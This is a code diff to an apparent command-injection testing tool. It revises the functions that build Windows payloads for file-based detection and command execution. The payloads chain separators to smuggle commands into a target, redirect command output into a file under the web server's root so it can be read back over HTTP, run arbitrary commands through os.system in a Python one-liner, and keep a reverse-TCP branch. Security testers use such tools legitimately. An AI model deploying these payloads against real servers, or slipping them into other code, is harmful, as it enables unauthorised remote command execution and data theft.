@@ -22,15 +22,24 @@ from src.utils import settings
 from src.core.injections.controller import checks
 
 """
+The output file, under the server's root directory, with its separators doubled so that a Windows
+path survives being read as a Python string literal.
+"""
+def windows_output_path(OUTPUT_TEXTFILE):
+  return (settings.WEB_ROOT + OUTPUT_TEXTFILE).replace("\\", "\\\\")
+
+"""
 File-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    cmd = settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'"
-    payload = (separator +
-              "for /f \"tokens=*\" %i in ('cmd /c \"" +
-              cmd +
-              "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL
+    chain = checks.windows_separator(separator)
+    if chain is None:
+      return ""
+    # The marker is read back from the file over HTTP, so writing it is all the payload has to do.
+    payload = (chain +
+              settings.WIN_FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
+              settings.SINGLE_WHITESPACE + "'" + TAG + "'" + checks.WINDOWS_TAIL
               )
   else:
     payload = (separator +
@@ -58,11 +67,12 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_interpreter(separator, TAG, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == settings.OS.WINDOWS:
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
-    payload = (separator +
-              "for /f \"tokens=*\" %i in ('cmd /c " +
-              python_payload +
-              "') do @set /p = %i " + settings.CMD_NUL
+    chain = checks.windows_separator(separator)
+    if chain is None:
+      return ""
+    payload = (chain +
+              settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + windows_output_path(OUTPUT_TEXTFILE) + "','w').write('" + TAG + "')\"" +
+              checks.WINDOWS_TAIL
               )
   else:
     payload = (separator +
@@ -98,11 +108,13 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
     payload = (separator + cmd)
 
   elif settings.TARGET_OS == settings.OS.WINDOWS:
-      cmd = cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
-      payload = (separator +
-              "for /f \"tokens=*\" %i in ('cmd /c \"" +
-              cmd +
-              "\"') do @set /p = %i " + settings.CMD_NUL
+    chain = checks.windows_separator(separator)
+    if chain is None:
+      return ""
+    # The output is read back from the file, so it is redirected there rather than printed.
+    payload = (chain +
+              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
+              checks.WINDOWS_TAIL
               )
   else:
     settings.USER_APPLIED_CMD = cmd
@@ -119,15 +131,16 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE):
   if settings.TARGET_OS == settings.OS.WINDOWS:
+    chain = checks.windows_separator(separator)
+    if chain is None:
+      return ""
     if settings.REVERSE_TCP:
-      payload = (separator + cmd + settings.SINGLE_WHITESPACE
+      payload = (chain + cmd + settings.SINGLE_WHITESPACE
                 )
     else:
-      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + "')\""
-      payload = (separator +
-                "for /f \"tokens=*\" %i in ('cmd /c " +
-                python_payload +
-                "') do @set /p = %i " + settings.CMD_NUL
+      payload = (chain +
+                settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + windows_output_path(OUTPUT_TEXTFILE) + "')\"" +
+                checks.WINDOWS_TAIL
                 )
   else:
     settings.USER_APPLIED_CMD = cmd
